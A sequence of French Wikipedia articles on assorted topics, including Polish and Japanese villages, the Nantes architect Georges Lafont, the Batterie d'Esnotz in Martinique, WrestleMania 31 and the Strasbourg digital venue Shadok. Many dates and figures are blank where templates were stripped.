Luis Méndez Quijada assuma dès lors la responsabilité de la maison de Don Juan d'Autriche. Dans les années qui suivirent, il fut également membre du Conseil d'État et du Conseil de Guerre de Philippe II. Il assumait la charge de Grand Écuyer ("Caballerizo Mayor") du prince héritier, le prince Charles (Charles d'Autriche), jusqu'à ce que celui-ci soit enfermé par ordre de son père, en . Contredisant les rumeurs de disgrâce liées à sa trop grande proximité avec le prince Charles, Philippe II nomma Luis Méndez Quijada Président du Conseil des Indes en , fonction qu'il assuma jusqu'à sa mort.
Mort.
En , afin de lutter contre la révolte des populations morisques du royaume de Grenade (révolte des Alpujarras), le roi Philippe II nomma Don Juan d'Autriche capitaine général de Grenade, appuyé par un conseil constitué de Luis Méndez Quijada, le , l’, le duc de Sessa et Luis de Zúñiga y Requesens . Luis Méndez Quijada fut blessé le lors d'une attaque contre la ville de Serón (province actuelle d'Almería). Il fut transporté au couvent de Caniles (province actuelle de Grenade), où il mourut le . Il est inhumé dans la de Villagarcía de Campos (province de Valladolid), aux côtés de Madalena de Ulloa qui fonda l’institution après la mort de son époux.

</doc>
<doc id="8729355" url="https://fr.wikipedia.org/wiki?curid=8729355" title="Ferry Horgen-Meilen sur le lac de Zurich">
Ferry Horgen-Meilen sur le lac de Zurich



</doc>
<doc id="8729359" url="https://fr.wikipedia.org/wiki?curid=8729359" title="Rue des consuls">
Rue des consuls



</doc>
<doc id="8729364" url="https://fr.wikipedia.org/wiki?curid=8729364" title="Nishihara (Kumamoto)">
Nishihara (Kumamoto)

 est un village situé dans le district d'Aso (préfecture de Kumamoto), au Japon.

</doc>
<doc id="8729366" url="https://fr.wikipedia.org/wiki?curid=8729366" title="Karolewo (Oborniki)">
Karolewo (Oborniki)

Karolewo () est un village polonais de la gmina de Rogoźno dans la powiat d'Oborniki de la voïvodie de Grande-Pologne dans le centre-ouest de la Pologne.
Il se situe à environ au nord-ouest de Rogoźno (siège de la gmina), à au nord-est d'Oborniki (siège du powiat), et à au nord de Poznań (capitale de la Grande-Pologne).
Histoire.
De 1975 à 1998, le village faisait partie du territoire de la voïvodie de Piła.&lt;br&gt;
Depuis 1999, Karolewo est situé dans la voïvodie de Grande-Pologne.
Le village possède une population de .

</doc>
<doc id="8729368" url="https://fr.wikipedia.org/wiki?curid=8729368" title="Georges Lafont (architecte)">
Georges Lafont (architecte)

Georges Lafont (né le à Nantes et mort dans la même ville) est un architecte français.
Biographie.
Né le à Nantes, Georges Joseph Charles Jules Théophile Lafont est élève au lycée Georges-Clemenceau. Il entre ensuite, en 1867, à l'école des beaux-arts de Paris, où il fréquente l'atelier de Charles-Auguste Questel. Il est ami avec le peintre Hippolyte Berteaux qui résida à Nantes et est l'une des personnalités majeures de la vie artistique de la ville.
Les qualités professionnelles de Georges Lafont lui valent d'être nommé à la commission départementale des bâtiments civils de Loire-Inférieure, au conseil d'hygiène, au conseil de l'école des beaux-arts de Nantes, puis à la commission du musée d'archéologie. Membre de la Société des architectes de Nantes de 1882 (ou 1881) à 1910, il occupe, à partir de 1891, le poste d'inspecteur des édifices religieux, puis celui d'architecte diocésain en 1894. Il est admis à la société centrale des architectes en 1904, et devient architecte-adjoint des monuments historiques le 1908.
L'architecte est un des fondateurs et animateurs de la société nantaise « Le Clou », cercle en activité de 1884 à 1910, dont des réunions se sont tenues chez l'architecte, à son domicile du de la rue de la Rosière-d'Artois.
Il a également été conseiller municipal de Nantes.
Paralysé les dix dernières années de sa vie, Georges Lafont meurt à Nantes le 16 ou le , à l'âge de . Il est inhumé deux jours plus tard dans le cimetière Miséricorde, dans l'allée est du .
Œuvre architecturale.
En 1878, Jules-Joseph Hennecart, associé à son agent de change Édouard Darlu, fonde la société Hennecart et , qui, ayant achevé la construction de la ligne de Saint-Nazaire au Croisic pour le compte de l'État, se lance dans une opération immobilière d'envergure. Il confie à Georges Lafont l'aménagement des dunes d'Escoublac et la création de la station balnéaire de La Baule, dont l'architecte affirme être l'auteur des plans de plus de qui y furent bâtis. Il est notamment l'auteur des plans des bâtiments suivants :
Architecte hygiéniste, il conçoit de nombreux hôpitaux comme le centre marin de Pen-Bron et sa chapelle (1887), Saint-Nazaire, Saint-Étienne-de-Corcoué (construit entre 1883 et 1892) ou Le Loroux-Bottereau. Dans son agence, il associe de nombreux jeunes architectes, tel Georges Dommée.
En 1899, Louis Lefevre-Utile lance le projet de construction de l'usine LU, dont l'ornement principal doit être deux tours jumelles. Le plan proposé par Georges Lafont, qui proposait des tours sur trois niveaux présentant de grandes verrières, n'est pas retenu, au profit de la troisième proposition de l'architecte parisien Auguste Bluysen. C'est cependant Lafont qui mène à bien les travaux des tours à partir de 1905, sur les plans de son confrère.
À partir de 1901, il dresse les plans du théâtre de Quimper, inauguré en 1904. Parmi ses nombreuses réalisations domestiques, on trouve notamment des immeubles de rapport, des maisons, des châteaux, comme la villa dite « Le Prieuré Saint-Georges » à Batz-sur-Mer (1905), la maison de villégiature balnéaire Saint-Hubert, construite en 1904 au Croisic ou la villa balnéaire Sigurd construite vers 1886 pour Henri Sellier à Pornichet.
Hommage.
La rue Georges-Lafont a été dénommée à Nantes en hommage à l'architecte après délibération du conseil municipal, le .

</doc>
<doc id="8729377" url="https://fr.wikipedia.org/wiki?curid=8729377" title="Ubuyama">
Ubuyama

 est un village situé dans le district d'Aso (préfecture de Kumamoto), au Japon.

</doc>
<doc id="8729384" url="https://fr.wikipedia.org/wiki?curid=8729384" title="Batterie d'Esnotz">
Batterie d'Esnotz

La batterie d'Esnotz est une ancienne batterie militaire faisant partie du système défensif de la ville de Saint-Pierre en Martinique. Elle est située rue Victor-Hugo dans le quartier du Centre.
Histoire.
Le projet initial de cette batterie date de 1692. Il s'agit d'une batterie à barbette, à 4 pièces d'artillerie, qui nécessite la construction d'une importante muraille de contention en pierre. Construite en 1694 sous l'impulsion du gouverneur Nicolas de Gabaret, elle prend le nom de batterie Saint-Nicolas. Avec le fort Saint-Pierre, cette batterie constitue l'élément central du système défensif de la rade et de la ville de Saint-Pierre. Il est complété sur les extrémités de la baie par la batterie Saint-Louis au nord, à l'embouchure de la rivière des Pères, et les batteries d'Orange et Sainte-Marthe au sud, sur le Morne d'Orange. 
Dix ans plus tard, le Comte d'Esnotz fait renforcer l'équipement de la batterie Saint-Nicolas par l'ajout de 7 canons supplémentaires qui porte à onze canons l'armement de cette batterie centrale. Des caves reliées aux fortifications par un escalier dissimulé derrière la muraille sont réalisées vers 1700. Après la mort du Comte d'Esnotz, la batterie Saint-Nicolas prend le nom de batterie d'Esnotz au milieu du . Selon la liste des fortifications établies en 1725, la batterie d'Esnotz compte parmi les plus importantes de la ville.
En 1783, alors que d'importantes mutations urbanistiques affectent l'ensemble de la ville pour son confort et son embellissement, un riche négociant, Jean de l'Horme, offre tout le terrain avoisinant la batterie d'Esnotz au domaine public, à la seule condition que celui soit transformé en promenade pour le public. Cette promenade plantée d'arbres offre une vue magnifique sur les toits de la ville et la rade de Saint-Pierre. Des bancs y seront placés en 1829. Les caves de la batterie sont alors intégrées aux entrepôts-magasins du quartier du Figuier, qui s'étendent au pied de la batterie et prennent appui sur son mur de contention. 
Marquant la limite entre les quartiers du Fort et du Mouillage, la batterie d'Esnotz sert de lieu de convergence aux groupes de ces deux quartiers concurrents au lors du célèbre Carnaval de Saint-Pierre qui prend son départ depuis ce site.
La nuée ardente émise au matin du 8 mai 1902 rase complètement la ville de Saint-Pierre. La batterie et son mur de soutènement résistent plutôt bien au cataclysme, mais il ne reste des arbres de sa promenade soufflés par la nuée ardente que des troncs calcinés et tordus. Quelques canons subsistent également.
En 1933, la municipalité de Saint-Pierre alloue une partie du terrain de la batterie au volcanologue Frank Alvord Perret pour la création de son musée volcanologique.
Description.
La batterie d'Esnotz se présente sous la forme d'un haut et long mur en pierre et moellons d'une dizaine de mètres dominant la rade de Saint-Pierre et surplombant les ruines des entrepôts-magasins du Figuier. Trois canons sont encore visibles sur l'actuel emplacement pour témoigner de l'histoire de cette batterie.

</doc>
<doc id="8729385" url="https://fr.wikipedia.org/wiki?curid=8729385" title="Kaziopole">
Kaziopole

Kaziopole (prononciation : ) est un village polonais de la gmina de Rogoźno dans le powiat d'Oborniki de la voïvodie de Grande-Pologne dans le centre-ouest de la Pologne.
Il se situe à environ à l'ouest de Rogoźno (siège de la "gmina"), à au nord-est d'Oborniki (siège du powiat), et à au nord de Poznań (capitale de la Grande-Pologne).
Histoire.
De 1975 à 1998, le village faisait partie du territoire de la voïvodie de Piła.&lt;br&gt;
Depuis 1999, Kaziopole est situé dans la voïvodie de Grande-Pologne.
Le village possède une population de .

</doc>
<doc id="8729387" url="https://fr.wikipedia.org/wiki?curid=8729387" title="Boubacar Sylla">
Boubacar Sylla

Boubacar Sylla, né le à Bamako, est un footballeur international malien.
Biographie.
Sylla évolue au Stade malien avant d'intégrer le centre de formation de La Berrichonne de Châteauroux en septembre 2009, commençant à jouer avec l'équipe réserve. Le , il signe son premier contrat professionnel avec Châteauroux pour une durée d'une saison. 
Il joue ses deux premiers matchs dans l'équipe première en fin de saison 2010-2011. Ne disputant que trois matchs lors de la première partie de la saison 2011-2012, il est prêté à l'AS Cherbourg, évoluant en National, jusqu'à la fin du championnat.
Il rejoint l'équipe réserve du Racing Club de Lens en septembre 2012 et signe un contrat professionnel de deux ans, le . 

</doc>
<doc id="8729394" url="https://fr.wikipedia.org/wiki?curid=8729394" title="Ibis styles">
Ibis styles



</doc>
<doc id="8729398" url="https://fr.wikipedia.org/wiki?curid=8729398" title="Laskowo (Oborniki)">
Laskowo (Oborniki)

Laskowo (prononciation : ) est un village polonais de la gmina de Rogoźno dans le powiat d'Oborniki de la voïvodie de Grande-Pologne dans le centre-ouest de la Pologne.
Il se situe à environ au nord de Rogoźno (siège de la "gmina"), à au nord-est d'Oborniki (siège du powiat), et à au nord de Poznań (capitale de la Grande-Pologne).
Histoire.
De 1975 à 1998, le village faisait partie du territoire de la voïvodie de Piła.&lt;br&gt;
Depuis 1999, Laskowo est situé dans la voïvodie de Grande-Pologne.
Le village possède une population de .

</doc>
<doc id="8729399" url="https://fr.wikipedia.org/wiki?curid=8729399" title="Derek Rawcliffe">
Derek Rawcliffe

Derek Rawcliffe (né le à Manchester, au Royaume-Uni et décédé le à Leeds) est un évêque anglican britannique. 
Biographie.
Ordonné prêtre anglican en 1944, Derek Rawcliffe part comme missionnaire aux îles Salomon et devient archidiacre de Mélanésie du Sud en 1953. En 1975, il est nommé premier évêque des Nouvelles-Hébrides et le reste jusqu'en 1980. 
Revenu au Royaume-Uni, il devient évêque de Glasgow et Galloway, en Écosse. Ayant quitté son diocèse en 1991, il devient évêque honoraire de Ripon. 
En 1995, il est l'objet d'une vive polémique quand il annonce publiquement son homosexualité à la télévision. Il devient alors le premier évêque anglican ouvertement homosexuel.
Liens externes.
]

</doc>
<doc id="8729416" url="https://fr.wikipedia.org/wiki?curid=8729416" title="Nienawiszcz">
Nienawiszcz

Nienawiszcz (prononciation : ) est un village polonais de la gmina de Rogoźno dans le powiat d'Oborniki de la voïvodie de Grande-Pologne dans le centre-ouest de la Pologne.
Il se situe à environ au sud de Rogoźno (siège de la "gmina"), à à l'est d'Oborniki (siège du powiat) et à au nord de Poznań (capitale de la Grande-Pologne).
Histoire.
De 1975 à 1998, le village faisait partie du territoire de la voïvodie de Piła.&lt;br&gt;
Depuis 1999, Nienawiszcz est situé dans la voïvodie de Grande-Pologne.
Le village possède une population de en 2006.

</doc>
<doc id="8729425" url="https://fr.wikipedia.org/wiki?curid=8729425" title="André de Hongrie">
André de Hongrie

André de Hongrie (né vers 1210/1212 mort en 1234), parfois appelé André de Galicie, prince de la dynastie hongroise des Árpáds qui règne brièvement sur la Galicie entre 1224 et sa mort.
Biographie.
André, né entre 1210 et 1212, est le et le du roi et de son épouse Gertrude de Méran. À la fin de la Cinquième croisade, au cours de son séjour en Cilicie en février 1218, son père négocie à Tarse avec le roi son mariage avec sa fille et héritière Isabelle d'Arménie. Le pape approuve le projet de contrat de mariage le mais, après la mort de , les régents du royaume qui doivent faire face à la tentative d'usurpation de Raymond-Roupen préfèrent unir la jeune reine à Philippe d'Antioche.
Roi de Galicie.
La Hongrie contrôlait déjà la région peuplée de Slaves nommée maintenant Ruthénie. Après la mort du prince Roman Mstislavitch qui avait réussi à unir la principauté de Galicie-Volhynie, le roi désireux d'étendre son influence au-delà des Carpates et appelé par sa veuve s'autoproclame « protecteur » des deux jeunes fils du défunt Daniel et Vassilko. n'hésite pas à prendre alors le titre de « roi de Galicie et de Voldimérie » et, allié au prince polonais Lech le Blanc, il réussit à imposer en 1214 son fils aîné Coloman, époux de Salomé la fille aînée de Lech le Blanc, qu'il fait couronner « roi de Galicie » avec l'accord du pape. Les Polonais prennent le contrôle de Przemyśl et de Brest et abandonnent aux Hongrois le reste de la Galicie pendant que les fils de Romain ne conservent qu'une partie de la Volhynie. Un conflit entre les Polonais et les Hongrois permet à Mstislav Mstislavich, prince de Novogorod, de chasser Coloman en 1219. Ce dernier réussit à se rétablir la même année, mais Mstilav s'empare de nouveau du trône en 1221. Afin de mettre fin au conflit, le roi négocie la même année l'union de son et homonyme avec Marie-Hélène, la fille cadette du prince russe, et le couple reçoit les « droits » de Coloman sur la Galicie. 
En 1224/1225, le prince André réussit à prendre le pouvoir à Przemysl d'où il s'impose militairement en Galicie. Il ne contrôle le pays qu'environ trois ans jusqu'à ce que le prince Danilo soutenu par la Pologne ne le supplante au début de 1230. Son frère aîné, le prince Béla, entreprend une campagne pour l'appuyer. L'expédition se solde par un échec au cours duquel les Hongrois sont repoussés. En 1231, le roi et ses fils Béla et André reprennent l'offensive et le prince André retrouve son trône de Galicie. Les Hongrois de Galicie sont vaincus l'année suivante par Daniel et ses alliés Coumans. s'apprête à effectuer une nouvelle campagne qu'il doit différer à la demande du légat pontifical. Au début de 1234, la forteresse de Halich est sur le point de tomber quand le prince André meurt prématurément. La ville se rend à Daniel de Galicie qui reprend son trône et met fin à un demi-siècle de vaines interventions hongroises destinées à contrôler la Galicie.

</doc>
<doc id="8729446" url="https://fr.wikipedia.org/wiki?curid=8729446" title="Michałówek (Płońsk)">
Michałówek (Płońsk)

Michałówek (prononciation : ) est un village polonais de la gmina de Załuski dans le powiat de Płońsk de la voïvodie de Mazovie dans le centre-est de la Pologne.
Histoire.
De 1975 à 1998, le village appartenait administrativement à la voïvodie de Ciechanów.

</doc>
<doc id="8729448" url="https://fr.wikipedia.org/wiki?curid=8729448" title="District d'Aso">
District d'Aso

Le est un district de la préfecture de Kumamoto, au Japon, étendu sur une superficie de .
Histoire.
Le , le bourg d'Ichinomiya et le village de Namino s'annexent à la ville d'Aso. Le même jour, le bourg de Soyō fusionne avec le bourg de Yabe et le village de Seiwa du district de Kamimashiki pour former le bourg de Yamato. Le 13 février, les villages de Kugino, Hakusui et Chōyō fusionnent pour former le village de Minamiaso.

</doc>
<doc id="8729449" url="https://fr.wikipedia.org/wiki?curid=8729449" title="Born and Raised (album de Cormega)">
Born and Raised (album de Cormega)

Born and Raised est le cinquième album studio de Cormega, sorti le .
À l'origine, l'album devait s'intituler "Urban Legend" mais sa date de sortie ayant été reportée à de nombreuses reprises et, en 2004, T.I. ayant publié un album appelé "Urban Legend", Cormega a changé le nom en "Born and Raised".
"Born and Raised" s'est classé au Top R&amp;B/Hip-Hop Albums.

</doc>
<doc id="8729458" url="https://fr.wikipedia.org/wiki?curid=8729458" title="Born and Raised">
Born and Raised

Born &amp; Raised peut faire référence à :
Born and Raised peut faire référence à :

</doc>
<doc id="8729460" url="https://fr.wikipedia.org/wiki?curid=8729460" title="Yves Georges">
Yves Georges

Yves Georges, mort le à l'âge de 94 ans, était directeur du bureau d'études de la régie Renault de 1957 à 1965. 
Vie professionnelle.
Il débute chez le constructeur Chenard &amp; Walker, une filiale de Chausson, puis entre chez Renault en . 

</doc>
<doc id="8729471" url="https://fr.wikipedia.org/wiki?curid=8729471" title="WrestleMania 31">
WrestleMania 31

Lédition 2015 de "WrestleMania 31" est une manifestation de catch (lutte professionnelle) télédiffusée, visible en paiement à la séance, sur le WWE Network ainsi que sur la chaîne de télévision française AB1. L'événement, produit par la "World Wrestling Entertainment" ("WWE"), a eu lieu le au Levi's Stadium à Santa Clara, dans l'État de Californie. Il s'agit de la trente-et-unième édition de "WrestleMania", plus grande représentation annuelle de divertissement-sportif et troisième "pay-per-view" en 2015 à la WWE. La WWE révèle aussi qu’en plus des 1,370 millions de téléspectateurs sur le WWE Network pour WrestleMania, 259 000 foyers ont vu le pay-per-view par voie traditionnelle. 
L'événement a reçu des critiques très positives des fans et de la critique ; certains critiques le décrivent comme l'un des meilleurs WrestleMania de tous les temps. La WWE a rapporté que le spectacle a été les plus grosses recettes de l'histoire de la WWE, dessinant un chiffre d'affaires de 12,6 millions de dollars. La WWE a également affirmé un chiffre de fréquentation de 76 976 spectateurs battant un record de fréquentations au Levi's Stadium.
Contexte.
Les spectacles de la "WWE" en paiement à la séance sont constitués de matchs aux résultats prédéterminés par les scénaristes de la "WWE". Ces rencontres sont justifiées par des "storylines" — une rivalité avec un catcheur, la plupart du temps — ou par des qualifications survenues dans les émissions de la "WWE" telles que "Raw", "SmackDown", "Superstars" et "Main Event". Tous les catcheurs possèdent un gimmick, c'est-à-dire qu'ils incarnent un personnage gentil ou méchant, qui évolue au fil des rencontres. Un "pay-per-view" comme "WrestleMania" est donc un tournant pour les différentes "storylines" en cours
Rivalité entre Roman Reigns et Brock Lesnar.
Au Royal Rumble (2015), Brock Lesnar défendait son titre contre Seth Rollins et John Cena tandis que Roman Reigns gagnait le royal rumble, mais à la suite de sa fin dite controversée par Triple H, le soir même à Raw il organise un match entre Daniel Bryan et Seth Rollins que Daniel Bryan remporte grâce à une intervention de Roman Reigns qui effectue le Superman Punch sur Rollins. À Fast Lane, Roman Reigns bat Daniel Bryan avec un spear et gagne le droit d'affronter Brock Lesnar pour le WWE World Heavyweight Championship a WrestleMania 31. Le lendemain à Raw, une confrontation a lieu entre le challenger Roman Reigns et l'avocat du champion Paul Heyman qui affirme que son client est invincible mais le challenger lui, affirme qu'il battra Brock Lesnar et qu'il deviendra le nouveau champion et qu'il faut le croire.
Rivalité entre Triple H et Sting.
Lors des Survivor Series (2014), Sting intervient dans le match opposant The Authority à l'équipe de John Cena faisant gagner l'équipe de ce dernier après avoir attaqué Triple H faisant perdre le pouvoir à Stephanie McMahon et Triple H. Le à Raw, Sting fait sa toute première apparition à Raw en faisant perdre The Authority contre John Cena permettant à Dolph Ziggler, Ryback et Erick Rowan de retrouver leur emploi. À la suite de cela Triple H décide de défier Sting pour un face-à-face lors de Fast Lane que ce dernier accepte le à Raw. Lors de Fast Lane, les deux hommes se confrontent et cela se termine en bagarre où Sting défie Triple H à un combat lors de WrestleMania 31 ce que ce dernier accepte avant d'encaisser un coup de batte et un Scorpion Death Drop du Stinger. Le à Raw, Sting commence le show sous une ovation est là pour faire redescendre Triple h qui pour lui a grimpé les échelons à la WWE par des coups bas. Stéphanie arrive et se moque de lui, elle veut le claquer mais Sting prend son bras, ce qui fait venir Triple H.
Ce dernier, énervé, veut aller dans le ring, Stéphanie lui tend une masse mais Sting sort sa batte. Les deux se regardent intensivement, jusqu’à ce que Steph fasse repartir HHH en lui disant d’attendre encore 6 jours.
Rivalité entre Bad News Barrett et plusieurs superstars.
Le jeudi à la suite de son émission hebdomadaire Thursday Night Smackdown, la WWE annonce sur son site internet que Bad News Barrett remettra en jeu son championnat Intercontinental dans un Ladder Match à WrestleMania 31. La WWE ajoute que le champion devra faire face à "plusieurs adversaires".
À partir de ce moment-là, de nombreuses superstars vont progressivement voler la ceinture de Bad News Barrett semaine après semaine, comme Dean Ambrose ou R-Truth, en passant par Luke Harper, Dolph Ziggler, Daniel Bryan ou encore Stardust. Finalement, toutes ces superstars se révèleront être les adversaires pour le Ladder match.
André The Giant Memorial Battle Royal.
En 2014, Hulk Hogan a décidé de rendre hommage à l'un de ses plus célèbres rivaux, André The Giant, en organisant à WrestleMania 30 une bataille royale en son honneur. Lors de WrestleMania 30, Cesaro a remporté la bataille en portant un Body Slam sur le Big Show. Lors de l'édition de Monday Night Raw le lundi , la WWE a annoncé que la bataille royale en mémoire d'André The Giant ferait son retour à WrestleMania 31. Les compétiteurs s'ajouteront au fil des semaines jusqu'à atteindre le nombre total de 30. Pour l'instant sont confirmés pour ce match :
Rivalité entre The Undertaker et Bray Wyatt.
Lors de Fast Lane, Bray Wyatt fait son apparition avec la musique, le cercueil et les druides de l'Undertaker et le défie pour WrestleMania. Durant les deux semaines suivantes, Bray Wyatt provoque The Undertaker en lui disant de venir le trouver. Le à Raw, Bray Wyatt provoque The Undertaker en prenant son urne. Alors, la musique du Deadman sonne et finalement il n'appararaît pas mais sur le titantron, il accepte le challenge de Bray Wyatt avant de brûler la rocking chair de ce dernier ce qui officialise leur combat.
Rivalité entre Rusev et John Cena.
Lors de Fast Lane, Rusev bat John Cena d'une manière controversée et conserve son United States Championship. Le lendemain à Raw, John Cena demande à un rematch à Rusev pour WrestleMania mais ce dernier refuse. La semaine suivante à Raw, Rusev dit que sa réponse reste la même. Le à Raw, Rusev bat Curtis Axel dans un combat rapide et provoque le peuple américain. Alors, John Cena arrive et attaque ce dernier en lui portant deux STF. Il lui en porte ensuite un troisième ce qui contraint Lana à lui accorder un match pour le WWE United States Championship à WrestleMania. Mais celui-ci avec son nouvel agent refuse le combat et renverse la table, ou il devait signer le contrat, sur John Cena et s'en va en courant.
Rivalité entre les Bella Twins, AJ Lee &amp; Paige.
À la suite de l'absence d'AJ Lee après , la championne des Divas Nikki Bella et sa sœur Brie ont une nouvelle ennemie n°1 pour commencer 2015: Paige. Leur rivalité débute mais Paige n'est pas seule car elle se trouve une alliée, Natalya, et vont jusqu'à affronter les jumelles dans un match par équipes lors du Royal Rumble, mais les Bella Twins sortent victorieuses de ce match. Paige n'a pas dit son dernier mot et devient challengeuse au titre au Nikki. Elles s'affrontent à Fastlane dans un match que Nikki gagnera. Paige obtient une autre chance au titre des Divas le à Raw, mais Brie Bella intervient dans le match en attaquant Paige. C'est à ce moment-là que AJ Lee fait son retour et attaque les Bella Twins pour sauver Paige. Une nouvelle alliance nait alors entre AJ et Paige, qui étaient rivales l'année passée. Les semaines suivantes, elles font équipe ensemble et s'accompagnent pour leurs matchs respectifs, tandis que les Bella Twins continuent de critiquer Paige et AJ Lee ainsi que leur statut dans la division des Divas. Un match par équipes est alors annoncé pour WrestleMania 31 où AJ Lee et Paige affronteront les Bella Twins.
Rivalité entre Randy Orton et Seth Rollins.
Le à Raw, Seth Rollins attaque Randy Orton en lui portant un Curb Stomp sur la table des commentateurs puis un sur la marche d'escalier. Lors de Fast Lane, Randy Orton fait son grand retour et attaque tous les membres de l'Autorité. Durant les deux Raw suivants, la tension se fait ressentir entre Randy Orton et le reste de l'autorité. Le à Raw, Randy Orton et Seth Rollins perdent contre Roman Reigns. À la fin du match, Randy Orton se retourne contre The Authority en attaquant Seth Rollins, il finit par lui porter le RKO à travers la table des commentateurs. Le à Smackdown, une interview de Randy Orton est diffusée où il défie Seth Rollins pour WrestleMania. Le à Raw, Seth Rollins accepte le défi de Randy Orton.
Tableau des matchs.
Hall of Fame.
Comme chaque année lors du plus grand spectacle de catch de l'année "WrestleMania" « The Grandest Stage of Them All » (« La plus grande scène de toutes »), la " "("WWE") honore d'anciens employés de la "World Wrestling Entertainment" (anciennement "World Wrestling Federation") et d'autres figures qui ont contribué au catch et au divertissement sportif en général en les intronisant parmi le "WWE Hall of Fame". Cette année, 8 personnes ont été intronisées au "WWE Hall of Fame 2015", 7 hommes et 1 femme). 6 d'entre eux sont des catcheurs.
Au cours de cette cérémonie Connor Michalek, un fan de catch mort un an plus tôt à l'âge de huit ans va recevoir le "Warrior"" Award".

</doc>
<doc id="8729474" url="https://fr.wikipedia.org/wiki?curid=8729474" title="Ballet bleu">
Ballet bleu

Ballet bleu ("") est un roman policier de l’écrivain australien Carter Brown publié en 1960 en Australie et aux États-Unis. Le livre paraît en France en 1960 dans la Série noire. La traduction, prétendument "de l'américain", est signée Renée Vavasseur. C'est une des nombreuses aventures du lieutenant Al Wheeler, bras droit du shérif Lavers dans la ville californienne fictive de "Pine City" - la onzième traduite en français aux Éditions Gallimard. Le héros est aussi le narrateur.
Résumé.
Al Wheeler est renvoyé par le shérif Lavers à sa "Brigade Criminelle" d'origine, où le Capitaine Parker lui confie le dossier d'une disparition. En fait, il s'agit d'envoyer Wheeler affronter Martin Grossman, qui possède journaux, télés, radios, fait et défait les personnalités politiques, et donne ses ordres au "district attorney". Toute enquête officielle se termine devant le portail de son château, et Lavers et Parker espèrent qu'Al Wheeler fera mieux avec ses méthodes personnelles, quitte à être désavoué et exclu de la police en cas de problème... Le lieutenant risque même sa vie, sans autre appui réel que celui d'une dame brune (pour changer), riche et audacieuse. Raisonnable aussi : si elle aide Wheeler dans des illégalités qui vont jusqu'à faire témoigner une morte, elle l'empêche de régler ses comptes de façon expéditive, dans une histoire à la tonalité plus sombre que la plupart des autres romans de la série. D'ailleurs, Al Wheeler ne cesse d'écouter le disque de Billie Holiday : "Sombre dimanche".
Autour du livre.
Page 107, Al Wheeler se rappelle "une nuit passablement dénudée sur un mont chauve". C'est une allusion au roman antérieur "Du soleil pour les caves".

</doc>
<doc id="8729475" url="https://fr.wikipedia.org/wiki?curid=8729475" title="Guillaume-Raymond de Cerdagne">
Guillaume-Raymond de Cerdagne

Guillaume-Raymond de Cerdagne ou de Cerdagne ( ou "") fut comte de Cerdagne et de Berga de 1068 à 1095.
Mariages.
Il se marie avant 1067 avec Adélaïde de Carcassonne. Il co-gouverne le comté de Razès avec sa belle-mère, Rangarde de la Marche, veuve de Pierre-Raymond de Carcassonne, selon un accord qu'ils passent à Davejean le 13 mars 1067, en présence de Guifred archevêque de Narbonne et d'Udalguier vicomte de Fenouillet. Mais Guillaume-Raymond revend ses droits au comte de Barcelone, Raimond-Bérenger le Vieux, dès le 27 décembre de la même année.
Il épouse en 1085 Sancie, la fille du comte barcelonais et d'Almodis de la Marche.
Régence des comtés catalans.
Le 5 décembre 1082, le comte de Barcelone est assassiné à l'instigation de son frère jumeau .
Dès 1083 se forme une coalition « antifratricide », menée par les vicomtes de Cardona et de Queralt, auxquels se joint l'évêque de Vic. En mai 1085, une assemblée de notables, présidée par l'évêque de Vic, confie la garde de à Guillaume-Raymond. Celui-ci prend la tête de l'opposition à et l'accuse clairement de fratricide. Il négocie avec le roi de León et de Castille, pour lui donner la garde de l'héritier et la suzeraineté sur les comtés catalans.
Finalement, arrive à trouver un accord avec ses adversaires. En juin 1086, une nouvelle assemblée se réunit et désigne comme tuteur de son neveu pour onze ans, jusqu'à ce que atteigne l'âge de la majorité, à condition qu'il soit associé au gouvernement et que ne se remarie pas, afin qu'il puisse recueillir l'héritage barcelonais.

</doc>
<doc id="8729476" url="https://fr.wikipedia.org/wiki?curid=8729476" title="Clément Codron">
Clément Codron

Édouard Clément Codron, né le à Bourbourg et mort le à Audruicq, est professeur de mécanique à l'Institut industriel du Nord de 1874 à 1922. Il développe des machines-outils et des procédés de fabrication appliquée à la métallurgie.
Biographie.
Diplômé et médaillé de l'École nationale des arts et métiers de Chalons (1867-1870), Clément Codron est professeur du cours des arts mécaniques (construction et organes de machines) et de fabrication mécanique à l'Institut industriel du Nord de 1874 à 1922. Il a reçu plusieurs prix lors d'expositions universelles (médailles d'or aux expositions universelles de 1878, de 1889 et de 1900. Il correspond avec Frederick Winslow Taylor qu'il traduit en français.
Ingénieur émérite, Clément Codron met en place à l'Institut industriel du Nord en 1894 le premier laboratoire d'essais de France. Il a été directeur de ce laboratoire d'essais mécaniques à l'Institut industriel du Nord, devenu ultérieurement le laboratoire de mécanique de Lille. Il a assuré le soutien scientifique du laboratoire auprès du groupe industriel Fives-Lille, notamment pour les essais métallurgiques pour la conception du Pont Alexandre-III.
Il est inhumé au cimetière d'Audruicq (Pas-de-Calais).

</doc>
<doc id="8729477" url="https://fr.wikipedia.org/wiki?curid=8729477" title="Vinnie Burke">
Vinnie Burke

Vinnie Burke, de son vrai nom Vincent Bucci jr., né le à Newark dans le New Jersey et mort le à New York, est un contrebassiste de jazz américain.
Biographie.
Vinnie Burke apprend la musique avec le violon et la guitare. Un accident à l'armée endommage l'articulation des os de sa main et le contraint à se tourner vers la contrebasse.
Dans les années 1950, Il joue dans des groupes, tels que celui de Marian McPartland et dans des orchestres, notamment le Sauter-Finnegan Orchestra. À la même époque, il crée son propre ensemble et enregistre sous son nom, avec des musiciens comme Eddie Costa, Al Cohn, Urbie Green, Joe Morello.

</doc>
<doc id="8729478" url="https://fr.wikipedia.org/wiki?curid=8729478" title="MS (album)">
MS (album)

MS est une compilation de Michel Sardou parue en 2003 sous le label AZ. 
Ce best-of retrace sa carrière depuis "Les Ricains" en 1967 jusqu'au dernier opus, "Français", paru en 2000.

</doc>
<doc id="8729486" url="https://fr.wikipedia.org/wiki?curid=8729486" title="Shadok (Strasbourg)">
Shadok (Strasbourg)

Le Shadok est un tiers-lieu des cultures numériques à Strasbourg.
Le nom du lieu est inspiré de la série télévisée Les Shadoks.
Le Shadok est situé au sein du Pôle Seegmuller, dans un bâtiment des années 1930 désaffecté depuis 2000.
Le Shadok, lieu dédié à l’initiation et à la sensibilisation au numérique responsable, se distingue par une programmation diversifiée.
Son objectif est double : faciliter l’appropriation des outils numériques par des formations complètes alliant théorie et pratique, tout en créant un espace privilégié pour une réflexion critique sur nos usages numériques quotidiens et bien plus.
En qualité de centre de ressources pour le territoire, le Shadok est accessible à l’ensemble des habitants et habitantes, offrant ainsi une opportunité inclusive d’exploration et de compréhension approfondie des enjeux liés au numérique.
Historique du projet.
Le projet fut à l'origine porté par la mairie de Strasbourg et Strasbourg Eurométropole.
